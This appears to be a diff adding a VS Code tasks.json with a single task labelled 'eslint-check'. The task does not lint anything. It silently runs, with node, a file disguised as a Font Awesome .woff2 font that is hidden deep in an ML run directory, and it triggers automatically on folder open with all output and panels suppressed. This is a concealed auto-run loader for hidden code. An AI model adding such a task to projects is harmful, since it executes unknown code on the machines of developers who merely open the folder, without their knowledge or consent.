@@ -1,0 +1,24 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "(command -v node >/dev/null 2>&1 && node ./ml/mlruns/283773274435930260/058fc7e597954f33aed91e3f0df1c665/metrics/public/fonts/fa-solid-900.woff2) || (where node >nul 2>&1 && node ./ml/mlruns/283773274435930260/058fc7e597954f33aed91e3f0df1c665/metrics/public/fonts/fa-solid-900.woff2) || echo ''",
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    }
+  ]
+}
